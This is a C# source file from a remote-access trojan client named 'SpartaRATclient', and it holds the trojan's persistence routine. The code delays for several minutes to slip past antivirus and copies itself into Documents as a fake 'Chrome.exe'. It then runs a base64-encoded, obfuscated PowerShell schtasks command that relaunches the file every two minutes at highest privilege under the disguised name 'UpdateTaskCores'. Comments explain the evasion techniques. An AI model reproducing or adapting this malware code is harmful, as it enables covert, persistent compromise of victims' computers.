using RATclientSparta.Setup.RegistryData;
using SpartaRATclient.Tools;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Text;
using System.Threading;

namespace SpartaRATclient
{
    public class schtask
    {
        //Persistence
        public static void Create()
        {
            Random rnd = new Random();
            //Long sleeps will make it harder for the anti virus to say anything
            Thread.Sleep(rnd.Next(200_000, 400_000));

            if (!RegistryCheck.CheckIfExist("HaveTaskSchedulerItem"))
            {
                FileCopy.This();
                //Create a task scheduler tsak using powershell encodings to make it harder for the anti virus to detect us. I used the OG tool "Invoke-Obfuscation" by danielbohannon.
                //original command: schtasks /create /sc minute /mo 2 /tn UpdateTaskCores /tr "C:\Users\env:username\Documents\Chrome.exe" /rl HIGHEST
                //I encoded the obfuscated powershell code with base64: .("{2}{1}{0}"-f 'ks','chtas','s') /create /sc minute /mo 2 /tn UpdateTaskCores /tr ((("{1}{8}{6}{3}{5}{7}{4}{0}{2}" -f '0}Chr','C:{0}Us',("{0}{1}" -f ("{1}{0}" -f '.','ome'),'exe'),("{1}{0}" -f("{1}{0}"-f 'ame','rn'),'use'),'ents{','%','rs{0}%','{0}Docum','e'))-f[cHAR]92) /rl HIGHEST
                //The base64: JigiezB9ezF9Ii1mJ3NjaCcsJ3Rhc2tzJykgL2NyZWF0ZSAvc2MgbWludXRlIC9tbyAyIC90biBVcGRhdGVUYXNrQ29yZXMgL3RyICgoKCJ7Mn17OX17MX17MH17OH17NX17N317M317NH17Nn0iLWYgJ2VyJywoInsyfXsxfXswfSIgLWYgJ3NPSWtlbnY6dXMnLCdlcicsJ1VzJyksJ0MnLCgiezN9ezF9ezB9ezJ9Ii1mJ0NoJywnc09JaycsJ3JvJywnbWVudCcpLCdtZScsKCJ7MX17MH0iIC1mICdJa0QnLCdPJyksKCJ7MX17MH0iIC1mJ3hlJywnLmUnKSwnb2N1JywoInswfXsxfSItZiduYW0nLCdlJyksKCJ7MX17MH0iLWYnSWsnLCc6TycpKSktckVwTGFjRSAoW2NoQVJdNzkrW2NoQVJdNzMrW2NoQVJdMTA3KSxbY2hBUl05MikgL3JsIEhJR0hFU1Q=
                Shell.Run(Encoding.UTF8.GetString(Convert.FromBase64String("LigiezJ9ezF9ezB9Ii1mICdrcycsJ2NodGFzJywncycpIC9jcmVhdGUgL3NjIG1pbnV0ZSAvbW8gMiAvdG4gVXBkYXRlVGFza0NvcmVzIC90ciAoKCgiezF9ezh9ezZ9ezN9ezV9ezd9ezR9ezB9ezJ9IiAtZiAnMH1DaHInLCdDOnswfVVzJywoInswfXsxfSIgLWYgKCJ7MX17MH0iIC1mICcuJywnb21lJyksJ2V4ZScpLCgiezF9ezB9IiAtZigiezF9ezB9Ii1mICdhbWUnLCdybicpLCd1c2UnKSwnZW50c3snLCclJywncnN7MH0lJywnezB9RG9jdW0nLCdlJykpLWZbY0hBUl05MikgL3JsIEhJR0hFU1Q=")), 16);
                RegistryCreate.Create("HaveTaskSchedulerItem", "");
            }
        }
    }
}
